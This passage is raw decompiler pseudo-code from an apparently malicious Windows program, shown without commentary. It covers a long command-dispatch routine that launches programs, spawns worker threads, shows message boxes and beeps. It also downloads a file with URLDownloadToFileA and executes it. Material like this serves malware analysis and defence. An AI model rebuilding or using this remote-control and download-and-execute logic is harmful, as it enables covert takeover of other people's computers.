0x49bd78;\n                                puStack1624 = 0x498494;\n                                fcn.0048ca28();\n                                puStack1624 = var_588h;\n                                uStack1628 = 0x49bd78;\n                                var_65ch = 0x4984aa;\n                                fcn.0048ca58();\n                                var_65ch = var_58ch;\n                                var_660h = 0x49bd78;\n                                puStack1640 = 0x4984c0;\n                                fcn.0048cd44();\n                                puStack1640 = var_590h;\n                                uStack1644 = 0x49bd78;\n                                fcn.0048b764();\n                                fcn.0048cddc();\n                                uVar13 = 1;\n                                fcn.0040f130();\n                                pcStack1668 = 0x49bd78;\n                                fcn.0048f1dc();\n                                fcn.0048f26c();\n                                fcn.004901c4();\n                                fcn.00405800();\n                                puStack1704 = 0x498582;\n                                fcn.00493ce0(&stack0xfffffffc);\n                            }\n                            puStack1704 = 0x49859c;\n                            fcn.00405964();\n                            puStack1704 = 0x4985ac;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1704 = 0x4985c0;\n                                fcn.004059a4();\n                                puStack1704 = 0x5;\n                                uStack1708 = 0;\n                                uStack1712 = 0;\n                                puStack1716 = 0x4985ce;\n                                puStack1716 = fcn.004058fc();\n                                uStack1720 = 0x49ba84;\n                                uStack1724 = 0;\n                                pcStack1728 = 0x4985db;\n                                sub.shell32.dll_ShellExecuteA();\n                            }\n                            pcStack1728 = &fcn.00493dac::var_5b0h;\n                            puStack1732 = 0x4985f4;\n                            fcn.00405964();\n                            puStack1732 = 0x498604;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1732 = 0x49861c;\n                                fcn.004059a4();\n                                puStack1732 = 0x498628;\n                                var_1b4h = fcn.00404610();\n                                puStack1732 = 0x49863c;\n                                (**(*var_1b4h + 0x2c))();\n                                puStack1736 = 0x4987b9;\n                                pcStack1740 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff934;\n                                uStack1744 = 0x498655;\n                                puStack1732 = &stack0xfffffffc;\n                                iVar3 = (**(*var_1b4h + 0x14))();\n                                if (-1 < iVar3 + -1) {\n                                    do {\n                                        uStack1744 = 0x498673;\n                                        (**(*var_1b4h + 0xc))();\n                                        fcn.00405a48();\n                                        fcn.00405964();\n                                        fcn.00405a48();\n                                        fcn.004059a4();\n                                        puStack1704 = 0x4986c1;\n                                        fcn.00405a48();\n                                        puStack1704 = 0x4986d1;\n                                        fcn.00405964();\n                                        puStack1704 = 0x4986de;\n                                        fcn.00405a48();\n                                        puStack1704 = 0x4986ed;\n                                        fcn.004059a4();\n                                        puStack1704 = &fcn.00493dac::var_14h;\n                                        uStack1708 = 0x4986fe;\n                                        fcn.00405a48();\n                                        uStack1708 = 0x49870e;\n                                        fcn.00405964();\n                                        uStack1708 = 0x49871b;\n                                        fcn.00405a48();\n                                        uStack1708 = 0x49872a;\n                                        fcn.004059a4();\n                                        uStack1708 = 0x498735;\n                                        fcn.00405504();\n                                        uStack1708 = 0x10;\n                                        uStack1712 = 0x40;\n                                        puStack1716 = 0x49873e;\n                                        var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n                                        puStack1716 = 0x498756;\n                                        fcn.004054c0();\n                                        puStack1716 = 0x498761;\n                                        fcn.004054c0();\n                                        puStack1716 = 0x49876c;\n                                        fcn.004054c0();\n                                        puStack1716 = 0x498777;\n                                        fcn.004054c0();\n                                        puStack1716 = &fcn.00493dac::var_4h;\n                                        uStack1720 = 0;\n                                        uStack1724 = var_1a4h;\n                                        pcStack1728 = fcn.004935c8;\n                                        puStack1732 = NULL;\n                                        puStack1736 = NULL;\n                                        pcStack1740 = 0x498792;\n                                        pcStack1740 = sub.kernel32.dll_CreateThread();\n                                        uStack1744 = 0x498798;\n                                        sub.kernel32.dll_CloseHandle_1();\n                                        iVar3 = iVar3 + -1;\n                                    } while (iVar3 != 0);\n                                }\n                                *in_FS_OFFSET = pcStack1740;\n                                puStack1732 = 0x4987c0;\n                                puStack1736 = 0x4987b8;\n                                fcn.00404640();\n                                return;\n                            }\n                            puStack1732 = &fcn.00493dac::var_5b4h;\n                            puStack1736 = 0x4987d9;\n                            fcn.00405964();\n                            puStack1736 = 0x4987e9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1736 = 0x498801;\n                                fcn.004059a4();\n                                puStack1736 = &fcn.00493dac::var_ch;\n                                pcStack1740 = 0x498812;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                pcStack1740 = 0x498822;\n                                fcn.00405964();\n                                pcStack1740 = 0x49882f;\n                                fcn.00405a48();\n                                pcStack1740 = 0x49883e;\n                                fcn.004059a4();\n                                pcStack1740 = 0x498849;\n                                fcn.00405504();\n                                pcStack1740 = 0x10;\n                                uStack1744 = 0x40;\n                                puStack1748 = 0x498852;\n                                var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n                                puStack1748 = 0x49886a;\n                                fcn.004054c0();\n                                puStack1748 = 0x498875;\n                                fcn.004054c0();\n                                puStack1748 = 0x498882;\n                                fcn.004054c0();\n                                puStack1748 = 0x49888f;\n                                fcn.004054c0();\n                                puStack1748 = &fcn.00493dac::var_4h;\n                                uStack1752 = 0;\n                                uStack1756 = var_1a4h;\n                                pcStack1760 = fcn.004935c8;\n                                uStack1764 = 0;\n                                uStack1768 = 0;\n                                uStack1772 = 0x4988aa;\n                                uStack1772 = sub.kernel32.dll_CreateThread();\n                                puStack1776 = 0x4988b0;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            puStack1776 = &fcn.00493dac::var_5b8h;\n                            puStack1780 = 0x4988c9;\n                            fcn.00405964();\n                            puStack1780 = 0x4988d9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1780 = 0x4988f1;\n                                fcn.004059a4();\n                                puStack1780 = &fcn.00493dac::var_ch;\n                                puStack1784 = 0x498902;\n                                fcn.00405a48();\n                                puStack1784 = 0x498912;\n                                fcn.00405964();\n                                puStack1784 = 0x49891f;\n                                fcn.00405a48();\n                                puStack1784 = 0x49892e;\n                                fcn.004059a4();\n                                puStack1784 = &fcn.00493dac::var_10h;\n                                puStack1788 = 0x49893f;\n                                fcn.00405a48();\n                                puStack1788 = 0x49894f;\n                                fcn.00405964();\n                                puStack1788 = 0x49895c;\n                                fcn.00405a48();\n                                puStack1788 = 0x49896b;\n                                fcn.004059a4();\n                                puStack1788 = &fcn.00493dac::var_14h;\n                                puStack1792 = 0x49897c;\n                                fcn.00405a48();\n                                puStack1792 = 0x49898c;\n                                fcn.00405964();\n                                puStack1792 = 0x498999;\n                                fcn.00405a48();\n                                puStack1792 = 0x4989a8;\n                                fcn.004059a4();\n                                puStack1792 = &fcn.00493dac::var_18h;\n                                uStack1796 = 0x4989b9;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                uStack1796 = 0x4989c9;\n                                fcn.00405964();\n                                uStack1796 = 0x4989d6;\n                                fcn.00405a48();\n                                uStack1796 = 0x4989e5;\n                                fcn.004059a4();\n                                uStack1796 = 0x4989f0;\n                                fcn.00405504();\n                                uStack1796 = 0x14;\n                                uStack1800 = 0x40;\n                                puStack1804 = 0x4989f9;\n                                uStack1812 = sub.kernel32.dll_LocalAlloc_1();\n                                puStack1804 = 0x498a07;\n                                fcn.004054c0();\n                                puStack1804 = 0x498a12;\n                                fcn.004054c0();\n                                puStack1804 = 0x498a1d;\n                                fcn.004054c0();\n                                puStack1804 = 0x498a28;\n                                fcn.004054c0();\n                                puStack1804 = 0x498a33;\n                                fcn.004054c0();\n                                puStack1804 = &fcn.00493dac::var_4h;\n                                uStack1808 = 0;\n                                pcStack1816 = fcn.00491220;\n                                uStack1820 = 0;\n                                uStack1824 = 0;\n                                uStack1828 = 0x498a48;\n                                uStack1828 = sub.kernel32.dll_CreateThread();\n                                puStack1832 = 0x498a4e;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            puStack1832 = &fcn.00493dac::var_5bch;\n                            uStack1836 = 0x498a67;\n                            fcn.00405964();\n                            uStack1836 = 0x498a77;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack1836 = 0x498a8b;\n                                fcn.004059a4();\n                                uStack1836 = 0x498a96;\n                                fcn.0048d2c8();\n                                uStack1836 = 0x498aa6;\n                                fcn.00405738();\n                                uStack1836 = 0x498ab4;\n                                fcn.0048e158();\n                                uStack1836 = 0;\n                                uStack1840 = 0;\n                                uStack1844 = 0;\n                                uStack1848 = 0x498ac5;\n                                fcn.0048d2c8();\n                                uStack1848 = 0x498ad5;\n                                fcn.00405738();\n                                uStack1848 = 0x498ae0;\n                                uStack1848 = fcn.004058fc();\n                                uStack1852 = 0x49c59c;\n                                uStack1856 = 0;\n                                puStack1860 = 0x498aed;\n                                sub.shell32.dll_ShellExecuteA();\n                            }\n                            puStack1860 = 0x498afa;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1864 = 0x498b98;\n                                pcStack1868 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff8b4;\n                                puStack1872 = 0x498b19;\n                                puStack1860 = &stack0xfffffffc;\n                                fcn.00481b68();\n                                if (var_5c8h != NULL) {\n                                    puStack1872 = 0x498b2d;\n                                    fcn.00481b68();\n                                    puStack1872 = 0x498b43;\n                                    fcn.00405784();\n                                    puStack1872 = 0x498b4e;\n                                    fcn.004938a4();\n                                }\n                                puStack1872 = 0x498b59;\n                                fcn.00481b94();\n                                if (var_5d4h != NULL) {\n                                    puStack1872 = 0x498b6d;\n                                    fcn.00481b94();\n                                    puStack1872 = 0x498b83;\n                                    fcn.00405784();\n                                    puStack1872 = 0x498b8e;\n                                    fcn.004938a4();\n                                }\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcStack1868;\n                            }\n                            puStack1860 = 0x498baf;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1860 = 0x498bbc;\n                                fcn.00481b68();\n                                puStack1860 = 0x498bd2;\n                                fcn.00405784();\n                                puStack1860 = 0x498bdd;\n                                fcn.004938a4();\n                            }\n                            puStack1860 = &fcn.00493dac::var_5e8h;\n                            puStack1864 = 0x498bf6;\n                            fcn.00405964();\n                            puStack1864 = 0x498c06;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1864 = 0x498c1a;\n                                fcn.004059a4();\n                                pcStack1868 = 0x498c6e;\n                                puStack1872 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff8b0;\n                                in_stack_fffff8a8 = &fcn.00493dac::var_5ech;\n                                puStack1864 = &stack0xfffffffc;\n                                fcn.0040ee40(in_stack_fffff8a8, *0x49b98c);\n                                fcn.00405504();\n                                fcn.0047e684();\n                                fcn.0047e20c();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = in_stack_fffff8a8;\n                            }\n                            puStack1872 = 0x498c85;\n                            fcn.00405894();\n                            if (uVar13) {\n                                in_stack_fffff8a8 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff8a8;\n                                puStack1872 = &stack0xfffffffc;\n                                piVar9 = fcn.0047e684();\n                                (**(*piVar9 + 0x10))();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = in_stack_fffff8a8;\n                            }\n                            puStack1872 = &fcn.00493dac::var_5f0h;\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                in_stack_fffff8a8 = &fcn.00493dac::var_10h;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                uStack1888 = 0x498d85;\n                                fcn.004819c0();\n                                uStack1888 = 0x498d96;\n                                fcn.00493ce0(puVar14);\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack1888 = 0x498e1a;\n                                puStack1892 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff89c;\n                                puStack1896 = NULL;\n                                uStack1900 = 0x498dbf;\n                                sub.ole32.dll_CoInitialize();\n                                uStack1900 = 0x498dca;\n                                fcn.004303ac();\n                                uStack1900 = 0x498ddb;\n                                fcn.00409a78();\n                                if (var_5f8h != 0) {\n                                    uStack1900 = 0x498def;\n                                    fcn.004303ac();\n                                    uStack1900 = 0x498e05;\n                                    fcn.00405784();\n                                    uStack1900 = 0x498e10;\n                                    fcn.004938a4();\n                                }\n                                uVar13 = 1;\n                                *in_FS_OFFSET = puStack1896;\n                            }\n                            puVar4 = &fcn.00493dac::var_608h;\n                            uStack1888 = 0x498e4f;\n                            fcn.00405964();\n                            uStack1888 = 0x498e5f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack1888 = 0x498e77;\n                                fcn.004059a4();\n                                uStack1888 = *0x4a4de8;\n                                puStack1892 = 0x498e8a;\n                                fcn.00405a48();\n                                puStack1892 = 0x498e9a;\n                                fcn.00405964();\n                                puStack1892 = 0x498ea7;\n                                fcn.00405a48();\n                                puStack1892 = 0x498eb6;\n                                fcn.004059a4();\n                                puStack1892 = &fcn.00493dac::var_ch;\n                                puStack1896 = 0x498ec7;\n                                fcn.00405a48();\n                                puStack1896 = 0x498ed7;\n                                fcn.00405964();\n                                puStack1896 = 0x498ee4;\n                                fcn.00405a48();\n                                puStack1896 = 0x498ef3;\n                                fcn.004059a4();\n                                puStack1896 = &fcn.00493dac::var_10h;\n                                uStack1900 = 0x498f04;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                uStack1900 = 0x498f14;\n                                fcn.00405964();\n                                uStack1900 = 0x498f21;\n                                fcn.00405a48();\n                                uStack1900 = 0x498f30;\n                                fcn.004059a4();\n                                uStack1900 = 0x498f3b;\n                                fcn.00405504();\n                                uStack1900 = 0x498f47;\n                                uVar5 = fcn.0043025c();\n                                **0x4a5004 = uVar5;\n                                uStack1900 = 0x14;\n                                uStack1904 = 0x40;\n                                puStack1908 = 0x498f58;\n                                var_778h = sub.kernel32.dll_LocalAlloc_1();\n                                puStack1908 = 0x498f63;\n                                fcn.0040546c();\n                                puStack1908 = 0x498f6e;\n                                fcn.004054c0();\n                                puStack1908 = 0x498f79;\n                                fcn.004054c0();\n                                puStack1908 = 0x498f84;\n                                fcn.004054c0();\n                                puStack1908 = 0x498f91;\n                                fcn.004054c0();\n                                puStack1908 = &fcn.00493dac::var_4h;\n                                uStack1912 = 0;\n                                var_77ch = fcn.00491a88;\n                                uStack1924 = 0;\n                                uStack1928 = 0;\n                                uStack1932 = 0x498fa6;\n                                uStack1932 = sub.kernel32.dll_CreateThread();\n                                sub.kernel32.dll_CloseHandle_1();\n                                **0x4a5110 = 1;\n                            }\n                            fcn.00405964();\n                            puStack1940 = 0x498fe0;\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                puStack1940 = &fcn.00493dac::var_ch;\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                puStack1944 = &fcn.00493dac::var_10h;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                puStack1952 = 0x499089;\n                                fcn.0048e214();\n                                puStack1952 = 0x49909a;\n                                fcn.00493ce0(arg_8h_02);\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b9ac();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b9d0();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b7d4();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b838();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b89c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b8e0();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b924();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048b968();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004817dc();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004817b4();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                fcn.0048182c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048182c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                fcn.0048174c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048174c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.00481610();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                fcn.00481610();\n                            }\n                            fcn.00405894();\n                            fcn.00405894();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.00481804();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1952 = NULL;\n                                uStack1956 = 0;\n                                uStack1960 = 0x49c890;\n                                puStack1964 = 0x499234;\n                                sub.winmm.dll_mciSendStringA();\n                            }\n                            puVar14 = &stack0xfffff9e8;\n                            puStack1952 = 0x49924d;\n                            fcn.00405964();\n                            puStack1952 = 0x49925d;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1952 = 0x499271;\n                                fcn.004059a4();\n                                puStack1952 = &fcn.00493dac::var_18h;\n                                uStack1956 = 0x499282;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                uStack1956 = 0x499292;\n                                fcn.00405964();\n                                uStack1956 = 0x49929f;\n                                fcn.00405a48();\n                                uStack1956 = 0x4992ae;\n                                fcn.004059a4();\n                                uStack1956 = 0x4992b6;\n                                uStack1956 = fcn.00409dd8();\n                                uStack1960 = 0x4992bf;\n                                uStack1960 = fcn.00409dd8();\n                                puStack1964 = 0x4992c5;\n                                sub.kernel32.dll_Beep();\n                            }\n                            puStack1964 = &stack0xfffff9e4;\n                            puStack1968 = 0x4992de;\n                            fcn.00405964();\n                            puStack1968 = 0x4992ee;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1968 = 0x499302;\n                                fcn.004059a4();\n                                puStack1968 = 0x49930f;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    puStack1968 = 0x499318;\n                                    fcn.00492f94();\n                                }\n                                else {\n                                    uVar13 = 1;\n                                    puStack1968 = 0x499321;\n                                    fcn.00492f94();\n                                }\n                            }\n                            puStack1968 = &stack0xfffff9e0;\n                            puStack1972 = 0x49933a;\n                            fcn.00405964();\n                            puStack1972 = 0x49934a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack1972 = 0x499362;\n                                fcn.004059a4();\n                                uStack1976 = 0x4993f5;\n                                pcStack1980 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff844;\n                                uStack1984 = 0;\n                                uStack1988 = 0;\n                                uStack1992 = 0x49937f;\n                                puStack1972 = &stack0xfffffffc;\n                                fcn.0048d2c8();\n                                uStack1992 = 0x49938f;\n                                fcn.00405738();\n                                uStack1992 = 0x49939a;\n                                uStack1992 = fcn.004058fc();\n                                uStack1996 = 0x4993a3;\n                                uStack1996 = fcn.004058fc();\n                                var_7cch = 0;\n                                uStack2004 = 0x4993ab;\n                                sub.URLMON.DLL_URLDownloadToFileA();\n                                uStack2004 = 5;\n                                uStack2008 = 0;\n                                uStack2012 = 0;\n                                puStack2016 = 0x4993bc;\n                                fcn.0048d2c8();\n                                puStack2016 = 0x4993cc;\n                                fcn.00405738();\n                                puStack2016 = 0x4993d7;\n                                puStack2016 = fcn.004058fc();\n                                puStack2020 = 0x49ba84;\n                                pcStack2024 = NULL;\n                                pcStack2028 = 0x4993e4;\n                                sub.shell32.dll_ShellExecuteA();\n                                pcStack2028 = 0x4993eb;\n                                fcn.00492f94();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcStack2024;\n                            }\n                            puStack2016 = &stack0xfffff9d4;\n                            puStack2020 = 0x499418;\n                            fcn.00405964();\n                            puStack2020 = 0x499428;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2020 = 0x499440;\n                                fcn.004059a4();\n                                pcStack2024 = 0x49954e;\n                                pcStack2028 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff814;\n                                uStack2032 = *0x4a4d50;\n                                uStack2036 = 0x499461;\n                                puStack2020 = &stack0xfffffffc;\n                                fcn.00405a48();\n                                uStack2036 = 0x499471;\n                                fcn.00405964();\n                                uStack2036 = 0x49947e;\n                                fcn.00405a48();\n                                uStack2036 = 0x49948d;\n                                fcn.004059a4();\n                                uStack2036 = *0x4a4d98;\n                                uStack2040 = 0x4994a0;\n                                fcn.00405a48();\n                                uStack2040 = 0x4994b0;\n                                fcn.00405964();\n                                uStack2040 = 0x4994bd;\n                                fcn.00405a48();\n                                uStack2040 = 0x4994cc;\n                                fcn.004059a4();\n                                uStack2040 = *0x4a4b88;\n                                puStack2044 = 0x4994df;\n                                fcn.00405a48();\n                                puStack2044 = 0x4994ef;\n                                fcn.00405964();\n                                puStack2044 = 0x4994fc;\n                                fcn.00405a48();\n                                puStack2044 = 0x49950b;\n                                fcn.004059a4();\n                                puStack2044 = 0x499516;\n                                fcn.00405504();\n                                puStack2044 = 0x49951e;\n                                uVar5 = fcn.00409dd8();\n                                **0x4a4cf4 = uVar5;\n                                puStack2044 = &fcn.00493dac::var_4h;\n                                uStack2048 = 0;\n                                uStack2052 = 0;\n                                pcStack2056 = fcn.00486ed8;\n                                puStack2060 = NULL;\n                                puStack2064 = NULL;\n                                puStack2068 = 0x49953c;\n                                sub.kernel32.dll_CreateThread();\n                                **0x4a4de0 = 1;\n                                uVar13 = 1;\n                                *in_FS_OFFSET = puStack2064;\n                            }\n                            pcStack2056 = 0x499565;\n                            fcn.00405894();\n                            if (uVar13) {\n                                **0x4a4de0 = 0;\n                            }\n                            pcStack2056 = &stack0xfffff9d0;\n                            puStack2060 = 0x499588;\n                            fcn.00405964();\n                            puStack2060 = 0x499598;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2060 = 0x4995b0;\n                                fcn.004059a4();\n                                puStack2060 = &fcn.00493dac::var_ch;\n                                puStack2064 = 0x4995c1;\n                                fcn.00405a48();\n                                puStack2064 = 0x4995d1;\n                                fcn.00405964();\n                                puStack2064 = 0x4995de;\n                                fcn.00405a48();\n                                puStack2064 = 0x4995ed;\n                                fcn.004059a4();\n                                puStack2064 = &fcn.00493dac::var_10h;\n                                puStack2068 = 0x4995fe;\n                                fcn.00405a48();\n                                puStack2068 = 0x49960e;\n                                fcn.00405964();\n                                puStack2068 = 0x49961b;\n                                fcn.00405a48();\n                                puStack2068 = 0x49962a;\n                                fcn.004059a4();\n                                puStack2068 = &fcn.00493dac::var_14h;\n                                puStack2072 = 0x49963b;\n                                fcn.00405a48();\n                                puStack2072 = 0x49964b;\n                                fcn.00405964();\n                                puStack2072 = 0x499658;\n                                fcn.00405a48();\n                                puStack2072 = 0x499667;\n                                fcn.004059a4();\n                                puStack2072 = &fcn.00493dac::var_18h;\n                                uStack2076 = 0x499678;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                uStack2076 = 0x499688;\n                                fcn.00405964();\n                                uStack2076 = 0x499695;\n                                fcn.00405a48();\n                                uStack2076 = 0x4996a4;\n                                fcn.004059a4();\n                                uStack2076 = 0x4996af;\n                                fcn.00405504();\n                                uStack2076 = 0x14;\n                                uStack2080 = 0x40;\n                                puStack2084 = 0x4996b8;\n                                uStack2092 = sub.kernel32.dll_LocalAlloc_1();\n                                puStack2084 = 0x4996c7;\n                                fcn.0048d2c8();\n                                puStack2084 = 0x4996d4;\n                                fcn.004054c0();\n                                puStack2084 = 0x4996df;\n                                fcn.004054c0();\n                                puStack2084 = 0x4996ea;\n                                fcn.004054c0();\n                                puStack2084 = 0x4996f5;\n                                fcn.004054c0();\n                                puStack2084 = 0x499700;\n                                fcn.004054c0();\n                                puStack2084 = &fcn.00493dac::var_4h;\n                                uStack2088 = 0;\n                                pcStack2096 = fcn.00491220;\n                                uStack2100 = 0;\n                                uStack2104 = 0;\n                                uStack2108 = 0x499715;\n                                uStack2108 = sub.kernel32.dll_CreateThread();\n                                puStack2112 = 0x49971b;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            puStack2112 = 0x499728;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2112 = 0x499742;\n                                fcn.00405784();\n                                puStack2112 = 0x49974d;\n                                fcn.004938a4();\n                            }\n                            puStack2112 = &stack0xfffff9c4;\n                            puStack2116 = 0x499766;\n                            fcn.00405964();\n                            puStack2116 = 0x499776;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2116 = 0x49978e;\n                                fcn.004059a4();\n                                uStack2120 = 0x499937;\n                                pcStack2124 = *in_FS_OFFSET;\n                                *in_FS_OFFSET = &stack0xfffff7b4;\n                                puStack2116 = &stack0xfffffffc;\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                cVar1 = fcn.0048d788();\n                                if (cVar1 == '\\0') {\n                                    *in_FS_OFFSET = &fcn.00493dac::var_14h;\n                                    *in_FS_OFFSET = &fcn.00493dac::var_18h;\n                                    goto code_r0x0049b71b;\n                                }\n                                sub.kernel32.dll_LocalAlloc_1();\n                                fcn.0048d2c8();\n                                fcn.00405784();\n                                fcn.004054c0();\n                                fcn.004054c0();\n                                fcn.004054c0();\n                                fcn.004054c0();\n                                pcVar10 = sub.kernel32.dll_CreateThread();\n                                sub.kernel32.dll_CloseHandle_1();\n                                uVar13 = 1;\n                                *in_FS_OFFSET = pcVar10;\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.00481b68();\n                                uVar13 = iStack1604 == 0;\n                                if (!uVar13) {\n                                    fcn.00481b68();\n                                    fcn.00405784();\n                                    fcn.004938a4();\n                                }\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.0047e684();\n                                fcn.0047e20c();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                sub.shell32.dll_ShellExecuteA();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.0048e7a0();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                fcn.0048e7a0();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                fcn.00409dd8();\n                                fcn.004058fc();\n                                fcn.004058fc();\n                                fcn.00409dd8();\n                                sub.user32.dll_MessageBoxA_1();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                puStack2244 = 0x499c2a;\n                                fcn.00484094();\n                                puStack2244 = 0x499c3b;\n                                fcn.00493ce0(arg_8h_01);\n                            }\n                            puStack2244 = 0x499c55;\n                            fcn.00405964();\n                            puStack2244 = 0x499c65;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2244 = 0x499c7d;\n                                fcn.004059a4();\n                                puStack2244 = &fcn.00493dac::var_ch;\n                                puStack2248 = 0x499c8e;\n                                fcn.00405a48();\n                                puStack2248 = 0x499c9e;\n                                fcn.00405964();\n                                puStack2248 = 0x499cab;\n                                fcn.00405a48();\n                                puStack2248 = 0x499cba;\n                                fcn.004059a4();\n                                puStack2248 = 0x499cc5;\n                                fcn.00405504();\n                                puStack2248 = 0x499ccf;\n                                fcn.0040546c();\n                                puStack2248 = var_ch;\n                                uStack2252 = 0x49ca54;\n                                puStack2256 = var_10h;\n                                uStack2260 = 0x499ce9;\n                                fcn.00405800();\n                                uStack492 = *0x4a4bb4;\n                                uVar13 = 1;\n                                uStack2260 = 0x499d06;\n                                fcn.00403ae4();\n                                uStack2260 = 0x499d18;\n                                fcn.0049d160();\n                                uStack2260 = 0x499d2e;\n                                fcn.004068a0();\n                                uStack2260 = 1000;\n                                uStack2264 = 0x499d38;\n                                sub.kernel32.dll_Sleep_1();\n                                uStack2264 = **0x4a4f1c;\n                                puStack2268 = 0x499d45;\n                                sub.wsock32.dll_closesocket();\n                            }\n                            puStack2268 = &stack0xfffff998;\n                            puStack2272 = 0x499d5e;\n                            fcn.00405964();\n                            puStack2272 = 0x499d6e;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack2272 = 0x499d86;\n                                fcn.004059a4();\n                                puStack2272 = &fcn.00493dac::var_ch;\n                                uStack2276 = 0x499d97;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                uStack2276 = 0x499da7;\n                                fcn.00405964();\n                                uStack2276 = 0x499db4;\n                                